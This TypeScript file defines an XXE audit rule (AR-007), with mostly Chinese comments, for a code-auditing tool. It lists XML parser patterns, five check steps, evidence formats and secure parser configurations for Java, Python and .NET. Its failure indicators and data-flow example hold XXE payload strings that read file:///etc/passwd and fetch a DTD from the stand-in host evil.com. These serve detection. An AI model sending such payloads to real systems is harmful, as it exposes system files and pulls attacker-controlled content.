/**
 * AR-007: XXE (XML External Entity) Check Rule
 * 
 * 功能: 检查XML解析配置,识别XXE注入风险
 * 焦点: 不是告诉AI"什么是XXE"
 *      而是定义AI"如何检查XML解析"的5步流程
 * 
 * 检查流程:
 *  1. XML解析入口识别
 *  2. 解析器配置检查
 *  3. DTD与外部实体处理
 *  4. 数据流追踪
 *  5. 输出处理检查
 */

import {
  AuditRule,
  SeverityLevel,
  EvidenceType,
  LanguageType
} from '../schemas/types';

export const XXECheckRule: AuditRule = {
  // ============================================================================
  // 基本信息
  // ============================================================================

  id: 'AR-007',
  name: 'XXE Check',
  description: '检查XML解析配置和处理逻辑,识别XML外部实体注入(XXE)风险',
  detail: `
本规则的目的是系统化地检查代码中的XML解析操作是否存在XXE注入风险。

核心理念:
- 不是问"这是XXE漏洞吗"
- 而是问"XML解析器是否禁止了外部实体、DTD解析是否被限制"

关键问题序列:
1. 代码中有哪些XML解析操作?
2. 解析器是否配置了安全选项(禁用DTD/外部实体)?
3. XML数据来自何处?
4. 解析结果如何被使用?
5. 错误信息是否泄露了内部路径?
  `,

  // ============================================================================
  // 触发条件
  // ============================================================================

  triggers: {
    patterns: [
      'Java XML解析: DocumentBuilderFactory / SAXParser / XMLReader',
      'Java XML转换: TransformerFactory / XPathFactory',
      'Python XML解析: xml.etree.ElementTree / lxml / xml.dom.minidom',
      'Node.js XML解析: libxmljs / xmldom / xml2js',
      'PHP XML解析: simplexml_load_string() / DOMDocument',
      '.NET XML解析: XmlDocument / XmlReader / XDocument',
      'SOAP处理: SOAPMessage / javax.xml.soap'
    ],
    languages: [
      LanguageType.Java,
      LanguageType.Python,
      LanguageType.JavaScript,
      LanguageType.TypeScript,
      LanguageType.PHP,
      LanguageType.CSharp
    ],
    frameworks: [
      'Spring',
      'JAXB',
      'DOM/SAX',
      'lxml',
      'libxmljs',
      'ASP.NET'
    ]
  },

  // ============================================================================
  // 检查流程 (核心!) - 这才是AI需要学习的
  // ============================================================================

  checks: [
    {
      order: 1,
      name: 'XML解析入口识别',
      condition: '识别代码中所有XML解析相关的调用和API使用',
      questions: [
        '代码中有哪些XML解析调用?',
        '使用了什么XML解析库或API?',
        'XML数据来自哪里(HTTP请求、文件、消息队列)?',
        '是否使用了SOAP或其他基于XML的协议?',
        '是否有自定义XML处理逻辑?'
      ],
      failureIndicators: [
        'DocumentBuilderFactory.newInstance() 无安全配置',
        'SAXParserFactory 无特性设置',
        'xml.etree.ElementTree.parse() 无防护',
        'lxml.etree.parse() 未禁用外部实体',
        'simplexml_load_string() 无LIBXML_NOENT检查',
        'XmlDocument.LoadXml() 无XmlReaderSettings'
      ],
      successIndicators: [
        'XML解析有明确的安全配置',
        '使用了安全XML解析库',
        'XML解析在受控范围内执行'
      ],
      criticality: 'must-have'
    },

    {
      order: 2,
      name: '解析器配置检查',
      condition: '检查XML解析器的安全配置是否禁用了危险特性',
      questions: [
        '是否禁用了DTD处理?',
        '是否禁用了外部实体解析?',
        '是否禁用了外部Schema/XSD加载?',
        '是否限制了XML实体扩展(XEE/ Billion Laughs攻击)?',
        '是否限制了XML解析的内存和CPU使用?'
      ],
      failureIndicators: [
        'DocumentBuilderFactory 未设置: setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true) / disallow-doctype-decl / external-general-entities = false',
        'SAXParser 未设置外部实体特性为false',
        'TransformerFactory 未设置XMLConstants.ACCESS_EXTERNAL_DTD',
        'Python lxml 未设置 resolve_entities=False',
        'PHP simplexml_load_string 使用 LIBXML_NOENT 标志',
        '.NET XmlReaderSettings.DtdProcessing 未设为 Prohibit 或 Ignore'
      ],
      successIndicators: [
        'Java: FEATURE_SECURE_PROCESSING = true',
        'Java: disallow-doctype-decl = true',
        'Java: external-general-entities = false',
        'Java: external-parameter-entities = false',
        'Java: ACCESS_EXTERNAL_DTD = ""',
        'Python: lxml with resolve_entities=False',
        'Python: defusedxml库',
        '.NET: DtdProcessing.Prohibit',
        'PHP: 不使用LIBXML_NOENT'
      ],
      criticality: 'must-have'
    },

    {
      order: 3,
      name: 'DTD与外部实体处理',
      condition: '检查DTD声明和外部实体引用的处理方式',
      questions: [
        'XML输入是否包含DOCTYPE声明?',
        'DOCTYPE中是否引用了外部实体?',
        '实体引用是否被展开?',
        '是否存在实体扩展攻击(XEE)风险?',
        '是否限制了实体数量和嵌套深度?'
      ],
      failureIndicators: [
        '接受包含<!DOCTYPE>的XML输入',
        '外部实体被解析: <!ENTITY xxe SYSTEM "file:///etc/passwd">',
        '参数实体: <!ENTITY % xxe SYSTEM "http://evil.com/dtd">',
        '实体扩展: &entity; 被完全展开',
        'Billion Laughs: 嵌套实体指数级扩展',
        '无实体数量或大小限制'
      ],
      successIndicators: [
        'DOCTYPE声明被完全拒绝',
        '外部实体引用被忽略',
        '实体展开被禁用',
        '有实体数量和大小限制',
        'XML Schema验证替代DTD'
      ],
      criticality: 'must-have'
    },

    {
      order: 4,
      name: '数据流追踪',
      condition: '追踪XML数据从输入到解析的完整路径',
      questions: [
        'XML数据从哪个入口进入系统?',
        '数据在解析前是否经过验证或过滤?',
        '是否有WAF或输入过滤拦截恶意XML?',
        '数据格式是否预期为XML?',
        'Content-Type是否被验证?'
      ],
      failureIndicators: [
        '用户可控制XML输入内容',
        '文件上传接受.xml文件无验证',
        'Content-Type未验证(text/xml被接受)',
        '无XML Schema验证',
        'XML数据来自不可信第三方'
      ],
      successIndicators: [
        'XML数据来自可信内部系统',
        '解析前有XML Schema验证',
        'WAF规则拦截恶意DOCTYPE',
        'Content-Type严格验证',
        '文件大小和结构限制'
      ],
      criticality: 'important'
    },

    {
      order: 5,
      name: '输出处理检查',
      condition: '检查XML解析结果的使用方式和错误处理',
      questions: [
        '解析后的XML数据如何使用?',
        '是否将解析结果直接返回给用户?',
        '错误信息是否包含文件路径或内部结构?',
        '是否可能通过错误消息泄露文件内容?',
        '解析结果是否用于进一步的安全敏感操作?'
      ],
      failureIndicators: [
        '解析错误返回完整堆栈跟踪',
        '错误消息包含文件路径: "Failed to load file:///etc/passwd"',
        '解析结果直接拼接到输出中',
        '实体值被直接展示在响应中',
        '异常处理泄露了XXE攻击是否成功'
      ],
      successIndicators: [
        '通用错误消息: "Invalid XML format"',
        '错误日志不包含文件路径',
        '解析结果经过验证后才使用',
        '异常统一处理不泄露内部信息'
      ],
      criticality: 'important'
    }
  ],

  // ============================================================================
  // 证据要求 - 每个发现都必须提供
  // ============================================================================

  evidence_requirements: [
    {
      type: EvidenceType.SourceCode,
      required: true,
      description: 'XML解析代码位置和配置上下文',
      example: `
不安全的XML解析:
  文件: src/main/java/com/app/XmlParser.java
  行号: 25-30
  代码:
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    // <- 未设置任何安全特性
    DocumentBuilder db = dbf.newDocumentBuilder();
    Document doc = db.parse(new InputSource(new StringReader(xmlInput)));
  
  文件: app.py
  行号: 15
  代码:
    from lxml import etree
    parser = etree.XMLParser()  # <- 未禁用外部实体
    tree = etree.parse(xml_file, parser)
      `,
      collection_guidance: `标注XML解析调用的文件路径和行号，展示完整的解析器配置代码，高亮缺失的安全配置，包括XML数据输入来源的代码。`
    },

    {
      type: EvidenceType.Configuration,
      required: true,
      description: 'XML解析相关配置、框架设置、依赖库版本',
      example: `
依赖检查:
  xercesImpl:2.9.1  -> 旧版本,默认允许外部实体
  lxml:4.6.0        -> 需确认resolve_entities配置
  
  框架配置:
  文件: web.xml
  内容: 检查是否有XML解析相关Servlet配置
      `,
      collection_guidance: `检查XML解析库版本，检查框架级XML处理配置，检查是否存在全局XML安全设置。`
    },

    {
      type: EvidenceType.DataFlow,
      required: false,
      description: 'XML数据从输入到解析的完整路径',
      example: `
数据流:
  1. 输入: POST /api/import Content-Type: text/xml
     Body: <?xml version="1.0"?>
           <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
           <root>&xxe;</root>
  
  2. 解析: db.parse(inputSource)
     问题: 未禁用DOCTYPE和外部实体
  
  3. 使用: doc.getTextContent() 返回解析结果
     问题: 可能泄露文件内容
      `,
      collection_guidance: `追踪XML数据的完整处理路径，标记每个处理步骤的安全控制，记录解析配置和输出处理方式。`
    }
  ],

  // ============================================================================
  // 修复建议
  // ============================================================================

  remediations: [
    {
      priority: SeverityLevel.Critical,
      action: '禁用DTD和外部实体解析 (Java)',
      code: `
// Java - 安全的DocumentBuilderFactory
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);

// Java - 安全的TransformerFactory
TransformerFactory tf = TransformerFactory.newInstance();
tf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");

// Java - 安全的SAXParser
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
      `,
      description: '通过设置XML解析器的安全特性,完全禁用DTD和外部实体解析,从根本上消除XXE风险。',
      difficulty: 'Easy'
    },

    {
      priority: SeverityLevel.High,
      action: '使用安全的XML解析库 (Python)',
      code: `
// Python - 使用defusedxml
from defusedxml import ElementTree as safeET
from defusedxml.lxml import fromstring

tree = safeET.parse(xml_file)
# 或
root = fromstring(xml_string)

// Python - lxml安全配置
from lxml import etree
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False,
    load_dtd=False
)
tree = etree.parse(xml_file, parser)
      `,
      description: '使用defusedxml库或正确配置lxml,禁用外部实体解析和网络访问。',
      difficulty: 'Easy'
    },

    {
      priority: SeverityLevel.Medium,
      action: '.NET安全XML解析配置',
      code: `
// C# - 安全的XmlReader
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;  // 禁止DTD
settings.XmlResolver = null;                       // 禁用外部解析
settings.MaxCharactersFromEntities = 0;            // 禁止实体展开

using (XmlReader reader = XmlReader.Create(stream, settings))
{
    XmlDocument doc = new XmlDocument();
    doc.XmlResolver = null;
    doc.Load(reader);
}
      `,
      description: '通过XmlReaderSettings配置,禁止DTD处理和外部实体解析。',
      difficulty: 'Easy'
    }
  ],

  // ============================================================================
  // 元数据
  // ============================================================================

  default_severity: SeverityLevel.High,
  cwe_ids: ['CWE-611'],  // Improper Restriction of XML External Entity Reference
  owasp_categories: [
    'A05:2021 - Security Misconfiguration',
    'A04:2017 - XML External Entities (XXE)'
  ],
  created_date: '2026-06-16',
  last_updated: '2026-06-16'
};

export default XXECheckRule;
